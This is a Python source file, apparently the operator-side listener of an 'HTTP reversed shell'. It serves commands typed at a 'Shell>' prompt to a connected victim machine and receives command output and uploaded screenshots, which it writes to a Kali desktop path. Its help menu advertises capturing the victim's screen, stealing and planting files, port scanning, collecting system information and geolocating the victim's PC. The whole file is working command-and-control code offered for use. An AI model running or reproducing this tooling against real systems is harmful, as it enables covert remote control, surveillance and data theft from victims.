# importing required modules
import http.server
from os import system
import cgi
import random

# Colors
GREEN = "\033[92m"
WHITE = "\033[97m"


def banner():
    """[display the tool banner]"""

    print(GREEN)
    print("[+] HTTP reversed shell help menu")
    print("--------------------------------------------\n")
    print("[1] Start listtining")
    print("[2] Print Shell Methods")
    print("[0] Exit.")
    print(WHITE, "\n")


def shell_help():
    """[display the shell methods]"""

    print(GREEN)
    print("\t  _____ _          _ _        _   _      _       ")
    print("\t /  ___| |        | | |      | | | |    | |      ")
    print("\t \ `--.| |__   ___| | |______| |_| | ___| |_ __  ")
    print("\t  `--. \ '_ \ / _ \ | |______|  _  |/ _ \ | '_ \ ")
    print("\t /\__/ / | | |  __/ | |      | | | |  __/ | |_) |")
    print("\t \____/|_| |_|\___|_|_|      \_| |_/\___|_| .__/ ")
    print("\t                                          | |    ")
    print("\t                                          |_|  \n")
    commands_banner = f"""
    \t[+]Available Commands @ HTTP reversed shell:
    \t==================================================\n
    \tget           - download files to your linux desktop.
                      Ex: >>> get photo.jpg\n
    \tsnapshot      - getting screenshot from victim screen.\n
    \tscan          - scanning ip with number of port numbers.
                      scan 127.0.0.1:80,8080,1177\n
    \tinformation   - getting pc information.\n
    \tfind          - find files with it's extension.
                      Ex: >>> find pdf@d:\\\n
    \tgeo_ip        - getting victim's PC geolocation.\n
    \tupload        - upload files from server to the victim PC.
                      Ex: >>> upload file_name@file_server_url\n
    \tend_session   - end the currant session.\n
    \t[?] any thing else will be passed to the terminal and you will get its result.\n{WHITE}
    """
    print(commands_banner)


class ServerHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        """Handling all the GET requests"""

        # reading command
        command = input("Shell> ")
        # return html status code 200
        self.send_response(200)
        # determine the type of the content
        self.send_header("Content-type", "text/html")
        self.end_headers()
        # write -send- the command to the server
        self.wfile.write(command.encode())
        if command == "end_session":
            quit()

    def do_POST(self):
        """Handling the Do method"""
        NO = random.randint(0, 900)
        if self.path == "/store":
            try:
                conyent_type, _ = cgi.parse_header(self.headers.get("content-type"))
                if conyent_type == "multipart/form-data":
                    getting_file = cgi.FieldStorage(
                        fp=self.rfile,
                        headers=self.headers,
                        environ={"REQUEST_METHOD": "POST"},
                    )
                else:
                    print("[-] Unexpected POST request")
                client_file = getting_file["file"]
                file_content = client_file.file.read()
                with open(f"/home/kali/Desktop/screen_no{NO}.png", "wb") as file_object:
                    print("[+] Writing file ..")
                    file_object.write(file_content)
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        # return html status code 200
        self.send_response(200)
        self.end_headers()
        # Define how many bytes the request contains
        # it return string by default so we will casting/converting it to integer
        length = int(self.headers["Content-length"])
        # read -receive- the command result from the client
        post_value = self.rfile.read(length).decode()
        # display the result on screen
        print(f"\n{GREEN}{post_value}{WHITE}")


if __name__ == "__main__":
    try:
        banner()

        while True:
            choice = int(input("User-Choice~# "))

            if choice == 1:
                host = input("[+] HOST: ")
                port = int(input("[+] PORT: "))
                # define the class server
                server_class = http.server.HTTPServer
                # define the server address
                server_address = (host, port)
                # you can read more # https://docs.python.org/3/library/http.server.html
                httpd = server_class(server_address, ServerHandler)

                # start our server
                # try to start HTTP server
                print("\n")
                print(
                    "[-] trying to start HTTP server @ {}:{}".format(
                        server_address[0], server_address[1]
                    )
                )
                print(
                    "[+] {}:{} HTTP server is up".format(
                        server_address[0], server_address[1]
                    )
                )
                print("[+] Wating for incomming connections. . .")
                httpd.serve_forever()
                system("clear")

            elif choice == 2:
                shell_help()

            elif choice == 0:
                exit()

            else:
                print("[-] Sorry, I can't Understand You :(")
                quit()

    except KeyboardInterrupt:
        # key interrupt to terminate HTTP server running proccess
        print("[!] Server is Down")
        # terminate HTTP server
        httpd.server_close()
